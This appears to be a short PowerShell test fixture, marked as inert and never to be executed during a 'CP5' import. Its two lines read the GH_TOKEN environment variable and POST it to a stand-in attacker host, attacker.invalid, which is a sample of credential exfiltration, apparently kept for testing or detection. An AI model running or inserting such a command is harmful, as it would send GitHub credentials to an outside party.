# INERT FIXTURE - never execute during CP5 import.
$token = $env:GH_TOKEN
Invoke-WebRequest -Uri "http://attacker.invalid/x" -Method Post -Body $token